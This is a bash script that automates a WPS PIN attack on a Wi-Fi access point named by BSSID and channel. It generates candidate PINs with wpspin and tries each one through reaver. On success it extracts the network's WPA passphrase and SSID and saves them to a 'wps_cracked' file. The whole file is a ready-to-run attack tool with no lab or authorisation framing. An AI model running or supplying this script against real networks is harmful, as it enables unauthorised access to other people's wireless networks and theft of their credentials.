#!/bin/bash

usage() {
    echo "Usage: $0 -c <channel> <BSSID>"
    echo "Example: $0 -c 6 60:38:E0:A2:3D:2A"
    exit 1
}

CHANNEL=""
while getopts "c:h" opt; do
    case $opt in
        c) CHANNEL="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done
shift $((OPTIND - 1))

if [ -z "$CHANNEL" ] || [ -z "$1" ]; then
    usage
fi

BSSID="$1"

# Validate channel
if ! echo "$CHANNEL" | grep -qE '^[0-9]+$' || [ "$CHANNEL" -lt 1 ] || [ "$CHANNEL" -gt 196 ]; then
    echo "Error: Invalid channel. Use a number between 1 and 196."
    exit 1
fi

# Validate BSSID format
if ! echo "$BSSID" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
    echo "Error: Invalid BSSID format. Expected format: XX:XX:XX:XX:XX:XX"
    exit 1
fi

echo "Target BSSID: $BSSID (channel $CHANNEL)"
echo "Generating PINs for BSSID: $BSSID"
echo "----------------------------------------"

# Generate PINs
PINS=$(wpspin -A "$BSSID" | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' ')
PIN_COUNT=$(echo "$PINS" | wc -w)
echo "Generated $PIN_COUNT PIN(s)"
echo "----------------------------------------"

# Create temporary file for reaver output
TEMP_OUTPUT=$(mktemp)

# Attempt each PIN
for PIN in $PINS
do
    echo "Attempting PIN: $PIN"
    
    # Run reaver and save output
    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b "$BSSID" -c "$CHANNEL" -p "$PIN" | tee "$TEMP_OUTPUT"
    
    # Check for successful PIN in output
    if grep -q "WPS PIN: '$PIN'" "$TEMP_OUTPUT"; then
        echo ""
        echo "✓✓✓ SUCCESS! ✓✓✓"
        echo "Correct PIN found: $PIN"
        
        # Extract credentials
        grep "WPA PSK:" "$TEMP_OUTPUT" | sed 's/^.*WPA PSK: //'
        grep "AP SSID:" "$TEMP_OUTPUT" | sed 's/^.*AP SSID: //'
        
        # Save to file
        {
            echo "BSSID: $BSSID"
            echo "Channel: $CHANNEL"
            echo "PIN: $PIN"
            grep "WPA PSK:" "$TEMP_OUTPUT"
            grep "AP SSID:" "$TEMP_OUTPUT"
            echo "Date: $(date)"
        } > "wps_cracked_${BSSID//:/_}.txt"
        
        rm "$TEMP_OUTPUT"
        exit 0
    fi
    
    echo "----------------------------------------"
done

rm "$TEMP_OUTPUT"
echo ""
echo "✗✗✗ Attack completed - No valid PIN found ✗✗✗"
